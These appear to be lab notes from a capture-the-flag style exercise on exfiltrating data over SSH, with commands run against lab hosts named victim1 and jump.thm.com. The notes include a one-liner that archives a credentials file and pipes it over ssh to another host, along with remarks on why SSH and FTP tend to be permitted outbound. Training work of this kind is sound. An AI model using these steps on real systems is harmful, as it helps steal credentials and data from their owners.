# Exfiltration using FTP/SSH/SCP/SFTP

FTP/SSH/SCP/SFTP might be permitted outbound, or at least most likely will be from some locations as they’re often 
used as data exchange protocols. Client tools are also readily available on systems without the need to pull down 
additional binaries.

The SSH protocol establishes a secure channel to interact and move data between the client and server. All transmission 
data is encrypted over the network or the Internet. To transfer data over SSH, use either the Secure Copy Protocol
(SCP) or the SSH client.

The server in this task has an SSH server enabled, so we can send and receive any exfiltrated data from it.

Connect to the victim1 or victim2 machine and check the data to be exfiltrated:

    ssh thm@<IP jumphost>
    thm@victim1:~$ cat task5/creds.txt

Wrap it up in an archive and send it to the jump host:

    thm@victim1:$ tar cf - task5/ | ssh thm@jump.thm.com "cd /tmp/; tar xpf -"

* `tar cf - task5/` - create an archive. The second dash belongs with the `f` meaning instead of creating a named 
file in the filesystem, write the tarred up files onto stdout.
* `ssh thm@jump.thm.com` - ssh into the jump host and ...
* `"cd /tmp/; tar xpf` - change the directory and unarchive the passed file.

Check the received data:
			
    thm@jump-box$ cd /tmp/task5/
    thm@jump-box:/tmp/task5$ cat creds.txt
